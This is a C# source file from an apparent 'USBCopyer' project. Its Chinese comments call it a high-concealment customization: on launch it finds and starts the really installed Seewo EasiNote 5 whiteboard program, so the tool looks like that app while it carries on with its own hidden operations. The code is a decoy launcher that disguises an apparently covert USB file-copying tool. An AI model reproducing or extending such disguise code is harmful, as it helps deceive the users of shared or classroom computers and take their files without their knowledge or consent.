using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace USBCopyer
{
    /// <summary>
    /// 高隐藏性定制：无参数双击启动时，先打开电脑中真实安装的希沃白板5（EasiNote），再进行后续操作。
    /// 不写死希沃程序路径：优先检测已在运行的希沃进程，其次查询注册表卸载信息，最后探测常见默认安装路径。
    /// 全部失败则静默跳过，不影响本程序自身运行。
    /// </summary>
    public static class EasiNoteLauncher
    {
        private static readonly string[] ProcessNames =
        {
            "EasiNote5",
            "EasiNote",
            "EasiNoteMain",
        };

        private static readonly string[] CandidatePaths =
        {
            @"C:\Program Files (x86)\Seewo\EasiNote5\EasiNote5.exe",
            @"C:\Program Files (x86)\Seewo\EasiNote5\EasiNote.exe",
            @"C:\Program Files\Seewo\EasiNote5\EasiNote5.exe",
            @"C:\Program Files\Seewo\EasiNote5\EasiNote.exe",
        };

        public static void TryLaunch()
        {
            try
            {
                // 1. 希沃已在运行则不重复启动
                foreach (string name in ProcessNames)
                {
                    if (Process.GetProcessesByName(name).Length > 0)
                        return;
                }

                // 2. 注册表卸载信息定位安装路径
                string regPath = FindFromRegistry();
                if (!string.IsNullOrEmpty(regPath) && Launch(regPath))
                    return;

                // 3. 常见默认安装路径探测（存在才启动）
                foreach (string path in CandidatePaths)
                {
                    if (Launch(path))
                        return;
                }
            }
            catch
            {
                // 静默失败
            }
        }

        /// <summary>
        /// 从注册表卸载信息中查找希沃白板5安装位置（64/32 位两处 Uninstall 键）。
        /// </summary>
        private static string FindFromRegistry()
        {
            try
            {
                string[] roots =
                {
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
                };

                foreach (string root in roots)
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(root))
                    {
                        if (key == null)
                            continue;

                        foreach (string sub in key.GetSubKeyNames())
                        {
                            using (RegistryKey app = key.OpenSubKey(sub))
                            {
                                if (app == null)
                                    continue;

                                object displayName = app.GetValue("DisplayName");
                                if (displayName == null)
                                    continue;

                                string name = displayName.ToString();
                                if (!name.Contains("希沃") && !name.ToLower().Contains("easinote"))
                                    continue;

                                // InstallLocation 目录内探测主程序
                                object loc = app.GetValue("InstallLocation");
                                if (loc != null && !string.IsNullOrEmpty(loc.ToString()))
                                {
                                    string dir = loc.ToString();
                                    foreach (string exe in new[] { "EasiNote5.exe", "EasiNote.exe" })
                                    {
                                        string full = Path.Combine(dir, exe);
                                        if (File.Exists(full))
                                            return full;
                                    }
                                }

                                // DisplayIcon 直接指向主程序
                                object icon = app.GetValue("DisplayIcon");
                                if (icon != null)
                                {
                                    string ico = icon.ToString().Trim('"');
                                    int comma = ico.IndexOf(',');
                                    if (comma > 0)
                                        ico = ico.Substring(0, comma);
                                    if (File.Exists(ico))
                                        return ico;
                                }
                            }
                        }
                    }
                }
            }
            catch
            {
            }
            return null;
        }

        private static bool Launch(string path)
        {
            try
            {
                if (string.IsNullOrEmpty(path) || !File.Exists(path))
                    return false;
                Process.Start(path);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
